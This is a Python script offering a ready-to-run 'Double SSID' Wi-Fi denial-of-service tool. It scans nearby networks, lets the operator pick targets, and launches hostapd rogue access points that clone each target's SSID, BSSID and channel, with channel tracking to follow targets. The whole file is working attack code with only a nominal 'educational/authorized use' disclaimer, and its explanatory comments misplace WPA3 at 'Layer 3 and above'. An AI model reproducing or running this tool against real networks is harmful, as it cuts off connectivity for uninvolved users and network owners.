#!/usr/bin/env python3
"""
================================================================================
Double_SSID_Attack_Tool
================================================================================
Start the script with: sudo python3 Double_SSID_Attack_Tool_WPA2_WPA3.py

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
"""
# This script is an advanced penetration testing tool that automates a highly effective
# Denial-of-Service attack against Wi-Fi networks. The name "Double SSID Attack" describe
# the core of the attack accurately: Exact clones of legitimate Access Points are created,
# leading to massive connection issues for clients.
#
# The Attack Concept: BSSID Confusion at Layer 2
#
# The extraordinary effectiveness of this attack is not based on cracking passwords,
# but on targeted disruption of fundamental Wi-Fi communication at the Data Link Layer (Layer 2)
# of the OSI model.
#
#   1. The Unique Identifier (BSSID): Every Access Point (AP) identifies itself in network traffic
#      by a unique hardware address, the BSSID (usually the MAC address of the AP). This BSSID
#      is like the forgery-proof ID card of the AP. The network name (SSID), however, is just
#      a name that many APs can share. A client uses the BSSID to unambiguously connect to
#      exactly one AP.
#
#   2. Exact Cloning: The script creates a rogue AP that not only uses the same name (SSID)
#      and the same channel but also clones the exact same BSSID as the original.
#
#   3. Protocol Confusion: A client device within range now sees two physical sources reporting
#      with the same unique BSSID on the same channel. The 802.11 Wi-Fi protocol is not designed
#      for such a scenario – it is a fundamental contradiction. The client cannot decide which AP
#      to communicate with. This leads to constant disconnections, failed authentication attempts,
#      and ultimately a complete loss of connectivity for all affected devices.
#
#   4. Why WPA3 does not protect: WPA3 is an extremely secure encryption and authentication protocol
#      that operates on higher layers (Layer 3 and above). It protects data transmission.
#      However, our attack takes place a level below that, involving the basic management frames
#      used for device connection. The confusion arises before a stable and secure WPA3 connection
#      can even be fully negotiated. The client fails at the fundamental task of unambiguously
#      associating with an AP.
#
import subprocess
import os
import time
import sys
import re
import threading
import signal
import shutil
import csv

# --- Configuration ---
CLONE_PASSWORD = "1234567a"

# --- UPDATED CONFIGURATION: Mixed WPA2/WPA3 (SAE) ---
HOSTAPD_CONF_TEMPLATE_PRIMARY = """
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
bssid={bssid}
country_code=PA
ieee80211d=1
auth_algs=1
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK SAE
rsn_pairwise=CCMP
ieee80211n=1
wmm_enabled=1
ieee80211w=1
"""

HOSTAPD_CONF_TEMPLATE_VIRTUAL = """
bss={interface}_{index}
ssid={ssid}
bssid={bssid}
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK SAE
rsn_pairwise=CCMP
ieee80211w=1
"""

OUI_FILE_PATHS = ['/usr/share/ieee-oui/oui.txt', '/usr/share/hwdata/oui.txt', '/var/lib/ieee-data/oui.txt']

def check_dependencies():
    deps = ['iw', 'ip', 'rfkill', 'airmon-ng', 'hostapd', 'airodump-ng', 'xterm']
    print("[*] Checking dependencies...")
    if not all(shutil.which(dep) for dep in deps):
        raise SystemExit(f"[-] Critical error: One of the tools is missing.")
    print("[+] All dependencies are met.")

def check_root():
    if os.geteuid() != 0: raise SystemExit("[-] Error: This script must be run with sudo privileges.")

def prepare_system():
    print("[*] Preparing system for the attack...")
    subprocess.run(['rfkill', 'unblock', 'wifi'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1); print("[+] System is ready.")

def cleanup_system():
    print("\n[*] Restarting network services...");
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Network services have been restarted.")

def load_oui_data():
    oui_data = {}
    for path in OUI_FILE_PATHS:
        try:
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    if '(hex)' in line:
                        parts = line.split(maxsplit=2)
                        if len(parts) >= 3:
                            oui = parts[0].replace('-', '')
                            manufacturer = parts[2]
                            oui_data[oui] = manufacturer
                if oui_data:
                    print("[+] OUI database successfully loaded.")
                    return oui_data
        except FileNotFoundError: continue
    print("[-] OUI database not found. Manufacturer will not be displayed.")
    return None

def get_oui_manufacturer(bssid, oui_data):
    if not oui_data: return "N/A"
    oui_prefix = bssid.replace(':', '').upper()[:6]
    return oui_data.get(oui_prefix, "Unknown")

def find_wireless_interfaces():
    interfaces = []
    try:
        result = subprocess.check_output(['airmon-ng'], stderr=subprocess.DEVNULL).decode('utf-8')
        lines = result.splitlines()
        header_index = next((i for i, line in enumerate(lines) if 'Interface' in line and 'Chipset' in line), -1)
        if header_index != -1:
            for line in lines[header_index + 1:]:
                parts = line.split()
                if len(parts) >= 4:
                    interfaces.append({'name': parts[1], 'chipset': ' '.join(parts[3:])})
        if interfaces: return interfaces
    except (FileNotFoundError, subprocess.CalledProcessError): pass
    print("[-] Airmon-ng could not be used. Showing interface names only.")
    try:
        names = re.findall(r'Interface\s+([a-zA-Z0-9]+)', subprocess.check_output(['iw', 'dev'], stderr=subprocess.DEVNULL).decode('utf-8'))
        return [{'name': name, 'chipset': 'N/A'} for name in names]
    except (FileNotFoundError, subprocess.CalledProcessError): return []

def set_interface_mode(interface, mode="monitor"):
    print(f"[*] Putting {interface} into {mode} mode...")
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['iw', 'dev', interface, 'set', 'type', mode], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except subprocess.CalledProcessError:
        print(f"[-] Error setting {mode} mode for {interface}."); return False

def ensure_interface_up(interface):
    print(f"[*] Activating interface {interface}...")
    try:
        subprocess.run(['rfkill', 'unblock', 'wifi'], stderr=subprocess.DEVNULL) # Ensure it is unblocked
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, stderr=subprocess.DEVNULL); return True
    except subprocess.CalledProcessError:
        print(f"[-] Error activating {interface}."); return False

def prepare_adapter_for_ap(interface):
    """
    Converts Monitor Interface (mon) to Managed Interface.
    """
    if interface.endswith("mon"):
        print(f"[*] Preparing attack interface {interface} (stopping monitor mode)...")
        try:
            subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            potential_real_name = interface.replace("mon", "")
            check = subprocess.run(['ip', 'link', 'show', potential_real_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if check.returncode == 0:
                print(f"[+] Interface reset: {potential_real_name}")
                return potential_real_name
            return interface
        except Exception:
            return interface
    return interface

def kill_proc_robust(p, interface_name=None):
    """
    Robust termination of processes.
    """
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            for _ in range(10):
                if p.poll() is not None: break
                time.sleep(0.1)
            if p.poll() is None:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except ProcessLookupError: pass
    
    if interface_name:
        try:
            subprocess.run(['pkill', '-9', '-f', f'hostapd.*{interface_name}'], stderr=subprocess.DEVNULL)
        except: pass

def parse_airodump_csv(csv_path):
    access_points = []
    try:
        if not os.path.exists(csv_path): return []
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f: lines = f.read().splitlines()
        ap_section_index = next((i for i, line in enumerate(lines) if 'BSSID, First time seen' in line), -1)
        if ap_section_index == -1: return []
        ap_lines = lines[ap_section_index + 1:]
        client_section_index = next((i for i, line in enumerate(ap_lines) if 'Station MAC, First time seen' in line), -1)
        if client_section_index != -1: ap_lines = ap_lines[:client_section_index]
        reader = csv.reader(ap_lines)
        for row in reader:
            try:
                if len(row) < 14: continue
                bssid, channel, essid = row[0].strip(), row[3].strip(), row[13].strip()
                if re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', bssid) and channel.isdigit():
                    access_points.append({'bssid': bssid, 'channel': int(channel), 'essid': essid})
            except IndexError: continue
    except Exception: pass
    return access_points

def get_hw_mode(channel):
    return 'g' if int(channel) <= 14 else 'a'

def select_targets_from_scan(monitor_interface, oui_data):
    scan_prefix = f"/tmp/scan_init"
    for f in os.listdir('/tmp/'):
        if f.startswith("scan_init"): os.remove(os.path.join('/tmp/', f))
    
    print("\n[*] Starting initial network scan...")
    airodump_cmd = ['xterm', '-geometry', '100x20', '-T', 'TARGET SELECTION SCANNER', '-e', 'airodump-ng', '--band', 'abg', '--write', scan_prefix, '--output-format', 'csv', monitor_interface]
    try: p = subprocess.Popen(airodump_cmd, preexec_fn=os.setsid); p.wait()
    except FileNotFoundError: raise SystemExit("[-] Error: 'xterm' not found.")

    found_aps = parse_airodump_csv(f"{scan_prefix}-01.csv")
    if not found_aps: raise SystemExit("[-] No networks found.")

    print("\n--- Found Networks ---")
    for i, ap in enumerate(found_aps):
        essid_display = ap['essid'] or '<HIDDEN/EMPTY>'
        manufacturer = get_oui_manufacturer(ap['bssid'], oui_data)
        print(f"  {i}: BSSID: {ap['bssid']} | Channel: {ap['channel']:<3} | ESSID: {essid_display:<20} | Manufacturer: {manufacturer}")
    
    selected_indices = input("\nSelect the numbers of the targets (e.g. '0,2'): ").split(',')
    selected_targets = []
    for index_str in selected_indices:
        try:
            index = int(index_str.strip())
            if 0 <= index < len(found_aps): selected_targets.append(found_aps[index])
        except ValueError: pass
    
    targets = []
    for target in selected_targets:
        if not target['essid']:
            target['ssid'] = input(f"Enter SSID for {target['bssid']}: ").strip() or "Unknown"
        else:
            target['ssid'] = target['essid']
        targets.append(target)
    return targets

# --- CORRECTION HERE: --bssid removed ---
def start_central_scanner(monitor_interface, targets):
    scan_prefix = "/tmp/central_scan"
    # Delete old files
    for f in os.listdir('/tmp/'):
        if f.startswith("central_scan"): os.remove(os.path.join('/tmp/', f))
    
    # We no longer filter hard by BSSID in the command, as this led to a crash ("invalid bssid").
    # We scan everything, Python filters the data.
    cmd = f"airodump-ng --band abg -w {scan_prefix} --output-format csv {monitor_interface}; read"
    args = ['xterm', '-geometry', '80x20', '-T', f'CENTRAL SCANNER ({monitor_interface})', '-e', 'bash', '-c', cmd]
    
    print(f"[*] Starting central scanner on {monitor_interface}...")
    return subprocess.Popen(args, preexec_fn=os.setsid)

def run_attack_thread(attack_interface, targets, stop_event, is_multi_ssid, enable_hopping):
    primary_target = targets[0]
    current_channel = primary_target['channel']
    hostapd_proc = None

    def update_ap(channel):
        nonlocal hostapd_proc
        kill_proc_robust(hostapd_proc, attack_interface)
        
        try:
            subprocess.run(['ip', 'link', 'set', attack_interface, 'down'], stderr=subprocess.DEVNULL)
            subprocess.run(['iw', 'dev', attack_interface, 'set', 'type', 'managed'], stderr=subprocess.DEVNULL)
            subprocess.run(['ip', 'link', 'set', attack_interface, 'up'], stderr=subprocess.DEVNULL)
            time.sleep(0.5)
        except: pass

        conf_file = f"/tmp/hostapd_{attack_interface}.conf"
        hw_mode = get_hw_mode(channel)
        
        conf_content = HOSTAPD_CONF_TEMPLATE_PRIMARY.format(
            interface=attack_interface, ssid=primary_target['ssid'], hw_mode=hw_mode,
            channel=channel, bssid=primary_target['bssid'], password=CLONE_PASSWORD)
        
        if is_multi_ssid:
            for i, target in enumerate(targets[1:]):
                conf_content += "\n" + HOSTAPD_CONF_TEMPLATE_VIRTUAL.format(
                    interface=attack_interface, index=i+1, ssid=target['ssid'],
                    bssid=target['bssid'], password=CLONE_PASSWORD)
        
        with open(conf_file, "w") as f: f.write(conf_content)
        
        ap_type = "Multi-SSID" if is_multi_ssid else "Single-SSID"
        print(f"[+] [{attack_interface}] Starting {ap_type} AP on channel {channel} (Target: {primary_target['ssid']})")
        
        cmd = f"hostapd {conf_file}; echo '[STOPPED]'; read"
        args = ['xterm', '-geometry', '90x25', '-T', f'ATTACK: {attack_interface} (CH {channel})', '-e', 'bash', '-c', cmd]
        
        time.sleep(1)
        hostapd_proc = subprocess.Popen(args, preexec_fn=os.setsid)

    update_ap(current_channel)
    
    scan_file = "/tmp/central_scan-01.csv"
    
    try:
        while not stop_event.is_set():
           if enable_hopping:
            time.sleep(4)
            ap_list = None
            for retry_attempt in range(3):
                ap_list = parse_airodump_csv(scan_file)
                if ap_list: break
                time.sleep(0.5)
            
            if not ap_list: continue
            
            found_target = next(
                (ap for ap in ap_list if ap['bssid'] == primary_target['bssid']), 
                None
            )
            
            if found_target:
                new_channel = found_target['channel']
                if new_channel != current_channel:
                    print(f"[!] [{primary_target['ssid']}] Channel change detected: {current_channel} -> {new_channel}")
                    current_channel = new_channel
                    update_ap(current_channel)
            else:
                pass
        else:
            time.sleep(2)
                
    finally:
        kill_proc_robust(hostapd_proc, attack_interface)
        try: os.remove(f"/tmp/hostapd_{attack_interface}.conf")
        except: pass

def main():
    involved_interfaces = set()
    threads = []; stop_event = threading.Event()
    central_scanner_proc = None

    try:
        check_root(); check_dependencies()
        oui_data = load_oui_data()
        
        use_multi_ssid = input("\n[?] Use Multi-SSID mode? [Y/n]: ").strip().lower() != 'n'
        enable_hopping = input("[?] Enable channel tracking? [y/N]: ").strip().lower() == 'y'
        
        prepare_system()
        
        all_ifaces = find_wireless_interfaces()
        if not all_ifaces: raise SystemExit("[-] No WiFi adapters found.")

        print("\nAvailable WiFi adapters:")
        for i, iface in enumerate(all_ifaces): print(f"  {i}: {iface['name']:<10} | Chipset: {iface['chipset']}")
        
        scan_idx = int(input("Select the adapter for the scanner (Monitor): "))
        scan_iface = all_ifaces[scan_idx]['name']
        involved_interfaces.add(scan_iface)
        
        set_interface_mode(scan_iface, "monitor")
        
        targets = select_targets_from_scan(scan_iface, oui_data)
        if not targets: raise SystemExit("[-] No targets.")

        attack_assignments = []
        available_attackers = [iface for iface in all_ifaces if iface['name'] != scan_iface]
        
        if not available_attackers: raise SystemExit("[-] No adapters left for attack.")

        if use_multi_ssid:
            grouped = {}
            for t in targets: grouped.setdefault(t['channel'], []).append(t)
            
            for channel, group in grouped.items():
                print(f"\n--- Group Channel {channel} ---")
                for t in group:
                    print(f"  Includes: {t['ssid']:<15} (BSSID: {t['bssid']})")
                
                if not available_attackers: raise SystemExit("[-] Not enough adapters.")
                
                print("Available adapters:")
                for j, iface in enumerate(available_attackers): 
                    print(f"  {j}: {iface['name']:<10} | {iface['chipset']}")
                
                idx = int(input("Select adapter: "))
                chosen = available_attackers.pop(idx)
                attack_assignments.append({'targets': group, 'adapter': chosen['name']})
                involved_interfaces.add(chosen['name'])
        else:
            for i, target in enumerate(targets):
                print(f"\n--- Configuration for Target {i+1} ---")
                print(f"  SSID:   {target['ssid']}")
                print(f"  BSSID:  {target['bssid']}")
                print(f"  Channel: {target['channel']}")
                
                if not available_attackers: raise SystemExit("[-] Not enough adapters.")
                
                print("Available adapters:")
                for j, iface in enumerate(available_attackers): 
                    print(f"  {j}: {iface['name']:<10} | {iface['chipset']}")
                
                idx = int(input("Select adapter: "))
                chosen = available_attackers.pop(idx)
                attack_assignments.append({'targets': [target], 'adapter': chosen['name']})
                involved_interfaces.add(chosen['name'])

        for assignment in attack_assignments:
            assignment['adapter'] = prepare_adapter_for_ap(assignment['adapter'])
            ensure_interface_up(assignment['adapter'])

        if enable_hopping:
            central_scanner_proc = start_central_scanner(scan_iface, targets)
            print("[*] Waiting for scanner initialization (8s)...")
            time.sleep(8) # Wait until CSV is written
            
            if not os.path.exists("/tmp/central_scan-01.csv"):
                print("[!] WARNING: Scanner CSV not created yet! Waiting another 5s...")
                time.sleep(5)
        else:
            print("[*] Hopping disabled. Monitor interface remains inactive.")

        print("\n[+] Starting attacks...")
        for assignment in attack_assignments:
            is_multi = use_multi_ssid and len(assignment['targets']) > 1
            t = threading.Thread(target=run_attack_thread, 
                                 args=(assignment['adapter'], assignment['targets'], stop_event, is_multi, enable_hopping))
            threads.append(t)
            t.start()
            time.sleep(1)

        print("\n[SUCCESS] Attack running. Ctrl+C to stop.")
        while True: time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Aborting...")
    except Exception as e:
        print(f"\n[-] Error: {e}")
    finally:
        stop_event.set()
        if central_scanner_proc: kill_proc_robust(central_scanner_proc)
        for t in threads: t.join(timeout=2)
        
        print("[*] Cleanup...")
        for iface in involved_interfaces:
            try:
                subprocess.run(['airmon-ng', 'stop', iface], stderr=subprocess.DEVNULL)
                real_name = iface.replace("mon", "")
                subprocess.run(['ip', 'link', 'set', real_name, 'down'], stderr=subprocess.DEVNULL)
                subprocess.run(['iw', 'dev', real_name, 'set', 'type', 'managed'], stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', real_name, 'up'], stderr=subprocess.DEVNULL)
            except: pass
            
        cleanup_system()
        print("[+] Done.")

if __name__ == "__main__":
    main()
